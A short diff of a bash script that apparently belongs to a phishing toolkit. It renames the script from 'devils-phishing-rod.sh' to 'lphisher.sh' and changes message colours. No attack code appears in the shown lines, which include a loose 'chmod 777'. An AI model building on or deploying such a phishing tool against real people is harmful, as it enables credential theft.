@@ -135,7 +135,7 @@ reset_color() {
 ## Exit message
 msg_exit() {
         { clear; banner; echo; }
-        echo -e "${GREENBG}${BLUE} Thank you for using this tool. Have a good day.${RESETBG}\n"
+        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
         { reset_color; exit 0; }
 }
 
@@ -154,10 +154,10 @@ kill_pid() {
 
 #check whether execute permission is granted
 xpermission(){
-if [ -x "devils-phishing-rod.sh" ];then
+if [ -x "lphisher.sh" ];then
 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 else
-        chmod 777 devils-phishing-rod.sh
+        chmod 777 lphisher.sh
         echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 fi
 }
@@ -168,7 +168,7 @@ check_net_update(){
 	if [ $netstats=="Online" ]; then
 		check_update
 	else
-		echo "${BLUE}Your offline, Check your internet and try again."
+		echo "${RED}Your offline, Check your internet and try again."
 		sleep 5
 		mainmenu
 	fi
